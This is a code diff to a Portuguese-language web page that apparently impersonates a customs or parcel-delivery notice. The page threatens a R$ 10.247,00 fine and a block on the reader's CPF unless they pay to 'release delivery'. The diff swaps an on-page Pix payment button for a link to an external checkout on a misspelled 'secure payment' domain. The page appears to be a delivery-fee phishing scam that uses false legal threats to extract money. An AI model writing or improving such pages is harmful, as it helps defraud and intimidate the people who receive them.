@@ -208,9 +208,10 @@ Evite complicações desnecessárias enquanto ainda há tempo.
 </audio>
 
 
-  <button id="liberarEntregaBtn" style="display:inline-block;padding:15px 25px;background:#1e88e5;color:#fff;border:none;border-radius:5px;font-size:18px;margin-top:15px;cursor:pointer;">
-    LIBERAR ENTREGA
-  </button>
+ <a href="https://pay.novopaggamentoseguro.com/checkout/7cffe209-432a-4c6a-a57d-4e7b662c5e47" target="_blank" id="liberarEntregaBtn" style="display:inline-block;padding:15px 25px;background:#1e88e5;color:#fff;border:none;border-radius:5px;font-size:18px;margin-top:15px;cursor:pointer;text-decoration:none;text-align:center;">
+  LIBERAR ENTREGA
+</a>
+
 
   <p style="margin-top:20px;">
     Atenção: O não pagamento implicará multa de até <span class="bold4">R$ 10.247,00</span> e bloqueio temporário do seu CPF, conforme o art. 45 do Decreto-Lei 37/66.
@@ -409,7 +410,6 @@ Evite complicações desnecessárias enquanto ainda há tempo.
       });
     }
 
-    document.getElementById('liberarEntregaBtn').addEventListener('click', gerarPix);
     pixCloseBtn.addEventListener('click', closePixPopup);
   });
 </script>
